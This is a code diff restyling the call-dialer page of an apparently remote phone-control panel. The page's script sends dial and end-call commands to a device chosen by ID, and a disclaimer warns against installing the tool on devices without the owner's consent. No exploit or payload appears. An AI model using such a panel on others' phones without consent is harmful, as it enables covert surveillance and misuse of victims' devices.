@@ -3,46 +3,135 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Call Dialer - Remote Access</title>
     <link rel="stylesheet" href="/css/hacker-theme.css">
+    <link href="https://api.fontshare.com/v2/css?f[]=satoshi@400,500,700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
     <style>
-        .container {
-            max-width: 460px;
-            margin: 20px auto 0;
+        :root {
+            --font-display: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            --font-mono: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
         }
 
-        header {
+        body {
+            padding: 0;
+            min-height: 100vh;
+            font-family: var(--font-display) !important;
+        }
+
+        .wrap {
+            max-width: 440px;
+            margin: 0 auto;
+            padding: 20px 20px;
+            animation: fadeInUp 0.4s ease-out;
+        }
+
+        /* ── HEADER ── */
+        .pg-header {
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            margin-bottom: 20px;
-            padding: 16px;
+            justify-content: space-between;
+            padding: 14px 18px;
             background: var(--bg-panel);
             border: 1px solid var(--border);
-            border-radius: 4px;
+            border-radius: 10px;
+            margin-bottom: 14px;
+            position: relative;
+            overflow: hidden;
         }
 
-        header::before {
-            display: none;
+        .pg-header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent 10%, var(--accent) 50%, transparent 90%);
+            opacity: 0.4;
         }
 
-        /* ===== STATUS BAR ===== */
+        .pg-header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .pg-icon {
+            width: 38px;
+            height: 38px;
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.12), rgba(0, 255, 65, 0.04));
+            border: 1px solid rgba(0, 255, 65, 0.25);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent);
+            box-shadow: 0 0 16px rgba(0, 255, 65, 0.08);
+        }
+
+        .pg-title {
+            font-family: var(--font-display);
+            font-size: 1rem;
+            font-weight: 700;
+            color: #e8e8e8;
+        }
+
+        .pg-title span {
+            color: var(--accent);
+            text-shadow: 0 0 12px rgba(0, 255, 65, 0.3);
+        }
+
+        .pg-sub {
+            font-family: var(--font-mono);
+            font-size: 0.55rem;
+            color: var(--text-muted);
+            letter-spacing: 1px;
+            margin-top: 1px;
+        }
+
+        .hdr-btn {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 7px 14px;
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            font-weight: 500;
+            text-decoration: none;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .hdr-btn:hover {
+            color: var(--accent);
+            border-color: rgba(0, 255, 65, 0.25);
+            background: rgba(0, 255, 65, 0.04);
+        }
+
+        /* ── STATUS BAR ── */
         .status-bar {
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
             padding: 10px 16px;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
             background: var(--bg-card);
             border: 1px solid var(--border);
-            border-radius: 4px;
-            font-size: 0.78rem;
+            border-radius: 8px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 600;
             text-transform: uppercase;
-            letter-spacing: 1.5px;
+            letter-spacing: 1px;
             color: var(--text-muted);
-            transition: all 0.3s ease;
+            transition: all 0.3s;
         }
 
         .status-bar .status-dot {
@@ -51,13 +140,14 @@
             border-radius: 50%;
             background: var(--text-muted);
             transition: all 0.3s;
+            flex-shrink: 0;
         }
 
         .status-bar.ringing {
             border-color: var(--warning);
             color: var(--warning);
             box-shadow: 0 0 12px rgba(255, 170, 0, 0.12);
-            animation: pulse-glow-warning 1.5s ease-in-out infinite;
+            animation: pulse-warn 1.5s ease-in-out infinite;
         }
 
         .status-bar.ringing .status-dot {
@@ -65,7 +155,7 @@
             box-shadow: 0 0 6px var(--warning);
         }
 
-        @keyframes pulse-glow-warning {
+        @keyframes pulse-warn {
 
             0%,
             100% {
@@ -88,13 +178,13 @@
             box-shadow: 0 0 6px var(--accent);
         }
 
-        /* ===== NUMBER DISPLAY ===== */
+        /* ── NUMBER DISPLAY ── */
         .number-display {
-            margin-bottom: 16px;
+            margin-bottom: 14px;
             border: 1px solid var(--border);
-            border-radius: 6px;
+            border-radius: 10px;
             background: var(--bg-panel);
-            transition: all 0.25s ease;
+            transition: all 0.25s;
             position: relative;
             overflow: hidden;
         }
@@ -108,7 +198,7 @@
             width: 0;
             height: 2px;
             background: linear-gradient(90deg, transparent, var(--accent), transparent);
-            transition: width 0.3s ease;
+            transition: width 0.3s;
         }
 
         .number-display.typing::before {
@@ -122,52 +212,55 @@
 
         .number-input {
             width: 100%;
-            height: 60px;
+            height: 62px;
             padding: 0 16px;
             border: none;
             background: transparent;
             color: var(--accent);
-            font-family: inherit;
+            font-family: var(--font-mono);
             font-size: 1.7rem;
             letter-spacing: 4px;
             text-align: center;
             text-shadow: 0 0 10px var(--accent-glow);
             outline: none;
             caret-color: var(--accent);
-            box-sizing: border-box;
             -webkit-appearance: none;
-            -moz-appearance: textfield;
-            appearance: none;
         }
 
         .number-input::placeholder {
             color: var(--text-muted);
             text-shadow: none;
             letter-spacing: 2px;
-            font-size: 0.9rem;
+            font-family: var(--font-display);
+            font-size: 0.85rem;
+            font-style: normal;
             opacity: 0.5;
         }
 
-        /* ===== DIALPAD GRID ===== */
+        /* ── DIALPAD ── */
         .dialpad {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 8px;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
 
         .dialpad-btn {
-            height: 54px;
+            height: 56px;
             border: 1px solid var(--border);
-            border-radius: 6px;
+            border-radius: 10px;
             background: var(--bg-card);
             color: var(--text-primary);
-            font-family: inherit;
+            font-family: var(--font-mono);
             font-size: 1.3rem;
             cursor: pointer;
-            transition: all 0.12s ease;
+            transition: all 0.12s;
             position: relative;
             overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
         }
 
         .dialpad-btn::after {
@@ -180,7 +273,7 @@
             border-radius: 50%;
             background: rgba(0, 255, 65, 0.12);
             transform: translate(-50%, -50%);
-            transition: width 0.35s ease, height 0.35s ease, opacity 0.35s ease;
+            transition: width 0.35s, height 0.35s, opacity 0.35s;
             opacity: 0;
         }
 
@@ -191,20 +284,22 @@
         }
 
         .dialpad-btn:hover {
-            border-color: var(--accent-dim);
+            border-color: rgba(0, 255, 65, 0.25);
             box-shadow: 0 0 8px var(--accent-glow);
             color: var(--accent);
         }
 
         .dialpad-btn:active {
             transform: scale(0.94);
-            background: rgba(0, 255, 65, 0.1);
+            background: rgba(0, 255, 65, 0.08);
             box-shadow: 0 0 15px var(--accent-glow);
         }
 
         .dialpad-btn .sub {
             display: block;
-            font-size: 0.5rem;
+            font-family: var(--font-display);
+            font-size: 0.4rem;
+            font-weight: 600;
             color: var(--text-muted);
             letter-spacing: 2px;
             margin-top: -2px;
@@ -215,50 +310,48 @@
             font-size: 1.1rem;
         }
 
-        /* ===== UTILITY ROW (backspace, +) ===== */
+        /* ── UTILITY ROW ── */
         .utility-row {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 8px;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
         }
 
-        /* ===== ACTION BUTTONS ===== */
+        /* ── ACTION BUTTONS ── */
         .action-buttons {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 8px;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
 
         .btn-action {
-            height: 48px;
+            height: 50px;
             border: 1px solid;
-            border-radius: 6px;
-            font-family: inherit;
-            font-size: 0.78rem;
+            border-radius: 10px;
+            font-family: var(--font-display);
+            font-size: 0.72rem;
             font-weight: 700;
             cursor: pointer;
             text-transform: uppercase;
-            letter-spacing: 1.5px;
-            transition: all 0.2s ease;
+            letter-spacing: 1px;
+            transition: all 0.2s;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 6px;
-            position: relative;
-            overflow: hidden;
         }
 
         .btn-call {
-            background: rgba(0, 255, 65, 0.12);
+            background: rgba(0, 255, 65, 0.1);
             color: var(--accent);
-            border-color: var(--accent-dim);
+            border-color: rgba(0, 255, 65, 0.25);
             grid-column: 1 / -1;
         }
 
         .btn-call:hover {
-            background: rgba(0, 255, 65, 0.22);
+            background: rgba(0, 255, 65, 0.2);
             box-shadow: 0 0 20px var(--accent-glow);
             transform: translateY(-1px);
         }
@@ -268,14 +361,14 @@
         }
 
         .btn-endcall {
-            background: rgba(255, 51, 51, 0.1);
+            background: rgba(255, 51, 51, 0.08);
             color: var(--danger);
-            border-color: rgba(255, 51, 51, 0.3);
+            border-color: rgba(255, 51, 51, 0.2);
         }
 
         .btn-endcall:hover {
-            background: rgba(255, 51, 51, 0.2);
-            box-shadow: 0 0 15px var(--danger-glow);
+            background: rgba(255, 51, 51, 0.15);
+            box-shadow: 0 0 15px rgba(255, 51, 51, 0.1);
         }
 
         .btn-endcall:active {
@@ -290,53 +383,162 @@
 
         .btn-clear:hover {
             color: var(--text-primary);
-            border-color: var(--text-secondary);
+            border-color: rgba(255, 255, 255, 0.15);
         }
 
         .btn-clear:active {
             transform: scale(0.97);
         }
 
+        /* ── DISCLAIMER ── */
+        .disc {
+            margin-top: 24px;
+            padding: 14px 18px;
+            background: rgba(255, 170, 0, 0.03);
+            border: 1px solid rgba(255, 170, 0, 0.1);
+            border-radius: 10px;
+        }
+
+        .disc h4 {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            font-weight: 600;
+            color: var(--warning);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+
+        .disc p {
+            font-family: var(--font-display);
+            font-size: 0.58rem;
+            color: var(--text-muted);
+            line-height: 1.5;
+        }
+
+        /* ── FOOTER ── */
+        .ft {
+            text-align: center;
+            padding: 28px 16px;
+            margin-top: 24px;
+            border-top: 1px solid var(--border);
+        }
+
+        .ft .ft-label {
+            font-family: var(--font-display);
+            font-size: 0.55rem;
+            color: var(--text-muted);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+
+        .ft .ft-brand {
+            display: inline-block;
+            font-family: var(--font-display);
+            font-size: 1.1rem;
+            font-weight: 700;
+            letter-spacing: 3px;
+            text-transform: lowercase;
+            text-decoration: none;
+            background: linear-gradient(135deg, var(--accent), #00e5ff, var(--accent));
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 0 6px rgba(0, 255, 65, 0.15));
+            transition: all 0.4s;
+        }
+
+        .ft .ft-brand:hover {
+            filter: drop-shadow(0 0 14px rgba(0, 255, 65, 0.35));
+            animation: brandShine 1.5s ease infinite;
+        }
+
+        @keyframes brandShine {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        .ft .ft-copy {
+            font-family: var(--font-mono);
+            font-size: 0.5rem;
+            color: rgba(255, 255, 255, 0.1);
+            margin-top: 6px;
+            letter-spacing: 1px;
+        }
+
         /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
-            .container {
+            .wrap {
                 max-width: 100%;
+                padding: 10px 12px;
             }
 
             .dialpad-btn {
-                height: 50px;
+                height: 52px;
                 font-size: 1.2rem;
             }
 
             .number-input {
                 font-size: 1.4rem;
-                height: 52px;
+                height: 54px;
             }
 
             .btn-action {
-                height: 44px;
-                font-size: 0.72rem;
+                height: 46px;
+                font-size: 0.68rem;
+            }
+
+            .pg-sub {
+                display: none;
             }
         }
     </style>
 </head>
 
 <body>
-    <div class="container">
-        <header>
-            <h1>&#x1F4DE; Call Dialer</h1>
-            <a href="index.html" class="btn btn-secondary">&lt;-- Back</a>
-        </header>
+    <div class="wrap">
 
+        <!-- HEADER -->
+        <div class="pg-header">
+            <div class="pg-header-left">
+                <div class="pg-icon"><i data-lucide="phone" style="width:18px;height:18px;"></i></div>
+                <div>
+                    <div class="pg-title"><span>Call</span> Dialer</div>
+                    <div class="pg-sub">// remote telephony</div>
+                </div>
+            </div>
+            <a href="index.html" class="hdr-btn">
+                <i data-lucide="arrow-left" style="width:14px;height:14px;"></i> Back
+            </a>
+        </div>
+
+        <!-- STATUS BAR -->
         <div class="status-bar" id="call-status">
             <span class="status-dot"></span>
-            IDLE — No Active Call
+            <i data-lucide="phone-off" style="width:13px;height:13px;"></i>
+            Idle — No Active Call
         </div>
 
+        <!-- NUMBER DISPLAY -->
         <div class="number-display" id="number-display">
-            <input type="tel" class="number-input" id="number-input" placeholder="Enter number..." autocomplete="off" />
+            <input type="tel" class="number-input" id="number-input" placeholder="Enter number..." autocomplete="off">
         </div>
 
+        <!-- DIALPAD -->
         <div class="dialpad">
             <button class="dialpad-btn" onclick="addDigit('1')">1</button>
             <button class="dialpad-btn" onclick="addDigit('2')">2<span class="sub">ABC</span></button>
@@ -352,24 +554,50 @@
             <button class="dialpad-btn special" onclick="addDigit('#')">#</button>
         </div>
 
+        <!-- UTILITY ROW -->
         <div class="utility-row">
             <button class="dialpad-btn special" onclick="addDigit('+')">+</button>
-            <button class="dialpad-btn special" onclick="backspace()">&#x232B;</button>
+            <button class="dialpad-btn special" onclick="backspace()">
+                <i data-lucide="delete" style="width:18px;height:18px;"></i>
+            </button>
+        </div>
+
+        <!-- CALL / END / CLEAR -->
+        <div class="action-buttons">
+            <button class="btn-action btn-call" onclick="dialCall()">
+                <i data-lucide="phone" style="width:16px;height:16px;"></i> Call
+            </button>
         </div>
 
         <div class="action-buttons">
-            <button class="btn-action btn-call" onclick="dialCall()">&#x1F4DE; Call</button>
+            <button class="btn-action btn-endcall" onclick="endCall()">
+                <i data-lucide="phone-off" style="width:14px;height:14px;"></i> End Call
+            </button>
+            <button class="btn-action btn-clear" onclick="clearNumber()">
+                <i data-lucide="x" style="width:14px;height:14px;"></i> Clear
+            </button>
         </div>
 
-        <div class="action-buttons">
-            <button class="btn-action btn-endcall" onclick="endCall()">&#x2716; End Call</button>
-            <button class="btn-action btn-clear" onclick="clearNumber()">Clear</button>
+        <!-- DISCLAIMER -->
+        <div class="disc">
+            <h4><i data-lucide="alert-triangle" style="width:11px;height:11px;"></i> Disclaimer</h4>
+            <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. Installing or using this on a device
+                without the owner's explicit consent is illegal and unethical.</p>
         </div>
     </div>
+
+    <!-- FOOTER -->
+    <footer class="ft">
+        <div class="ft-label">crafted by</div>
+        <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="ft-brand">thiyo-de</a>
+        <div class="ft-copy">&copy; 2025 &middot; all rights reserved</div>
+    </footer>
 
     <script src="/js/api.js"></script>
     <script src="/js/call-notification.js"></script>
     <script>
+        lucide.createIcons();
+
         const deviceId = new URLSearchParams(window.location.search).get('deviceId');
         let currentNumber = '';
         let callState = 'IDLE';
@@ -418,9 +646,8 @@
             display.classList.toggle('typing', currentNumber.length > 0);
         }
 
-        // Sync typed input back to currentNumber
+        // Sync typed input
         document.getElementById('number-input').addEventListener('input', function (e) {
-            // Allow only valid phone chars
             currentNumber = e.target.value.replace(/[^0-9+*#\s\-()]/g, '');
             e.target.value = currentNumber;
             document.getElementById('number-display').classList.toggle('typing', currentNumber.length > 0);
@@ -428,52 +655,36 @@
 
         // Enter key = dial
         document.getElementById('number-input').addEventListener('keydown', function (e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                dialCall();
-            }
+            if (e.key === 'Enter') { e.preventDefault(); dialCall(); }
         });
 
         async function dialCall() {
-            if (!currentNumber) {
-                api.showToast('Please enter a phone number', 'error');
-                return;
-            }
-
+            if (!currentNumber) { api.showToast('Please enter a phone number', 'error'); return; }
             try {
-                const response = await api.sendCommand(deviceId, 'call_dial', {
-                    number: currentNumber
-                });
-
+                const response = await api.sendCommand(deviceId, 'call_dial', { number: currentNumber });
                 if (response.success && response.data && response.data.status === 'success') {
-                    api.showToast(`Dialing ${currentNumber}...`, 'success');
+                    api.showToast('Dialing ' + currentNumber, 'success');
                 } else {
                     throw new Error(response.error || response.data?.error || 'Failed to dial');
                 }
-            } catch (error) {
-                api.showToast(error.message, 'error');
-            }
+            } catch (error) { api.showToast(error.message, 'error'); }
         }
 
         async function endCall() {
             try {
                 const response = await api.sendCommand(deviceId, 'call_end');
-
                 if (response.success && response.data && response.data.status === 'success') {
                     api.showToast('Call ended', 'success');
                 } else {
                     throw new Error(response.error || response.data?.error || 'Failed to end call');
                 }
-            } catch (error) {
-                api.showToast(error.message, 'error');
-            }
+            } catch (error) { api.showToast(error.message, 'error'); }
         }
 
         function syncStatusBar() {
             const overlay = document.getElementById('call-notify-overlay');
             const inner = document.getElementById('call-notify-inner');
             const statusBar = document.getElementById('call-status');
-
             if (!overlay || !statusBar) return;
 
             const isVisible = overlay.classList.contains('visible');
@@ -482,45 +693,25 @@
 
             if (isRinging) {
                 const numberEl = document.getElementById('cn-number');
-                statusBar.innerHTML = '<span class="status-dot"></span> \u{1F4F2} RINGING — ' + (numberEl ? numberEl.textContent : 'Incoming Call');
+                statusBar.innerHTML = '<span class="status-dot"></span><i data-lucide="phone-incoming" style="width:13px;height:13px;"></i> Ringing — ' + (numberEl ? numberEl.textContent : 'Incoming Call');
                 statusBar.className = 'status-bar ringing';
                 callState = 'RINGING';
             } else if (isActive) {
                 const numberEl = document.getElementById('cn-number');
-                statusBar.innerHTML = '<span class="status-dot"></span> \u{1F4DE} OFFHOOK — ' + (numberEl ? numberEl.textContent : 'Call Connected');
+                statusBar.innerHTML = '<span class="status-dot"></span><i data-lucide="phone-call" style="width:13px;height:13px;"></i> Offhook — ' + (numberEl ? numberEl.textContent : 'Call Connected');
                 statusBar.className = 'status-bar offhook';
                 callState = 'OFFHOOK';
             } else {
-                statusBar.innerHTML = '<span class="status-dot"></span> IDLE — No Active Call';
+                statusBar.innerHTML = '<span class="status-dot"></span><i data-lucide="phone-off" style="width:13px;height:13px;"></i> Idle — No Active Call';
                 statusBar.className = 'status-bar';
                 callState = 'IDLE';
             }
+            lucide.createIcons();
         }
 
-        // Sync every 1 second (lightweight DOM check, no API calls)
         setInterval(syncStatusBar, 1000);
-
-        // Initial sync
         setTimeout(syncStatusBar, 2000);
     </script>
-
-    <!-- Disclaimer -->
-    <div class="container">
-        <div class="disclaimer">
-            <h4>&#x26A0;&#xFE0F; Disclaimer</h4>
-            <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. It is designed for users to remotely
-                manage their own devices. Installing or using this application on a device without the owner's explicit
-                consent is illegal and unethical. The developers assume no liability for misuse. By using this
-                application, you agree that you are solely responsible for how it is used.</p>
-        </div>
-    </div>
-
-    <!-- Footer -->
-    <footer class="site-footer">
-        <p class="footer-created">Created by</p>
-        <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="footer-brand">thiyo-de</a>
-        <p class="footer-copy">&copy; 2025 All Rights Reserved</p>
-    </footer>
 </body>
 
 </html>
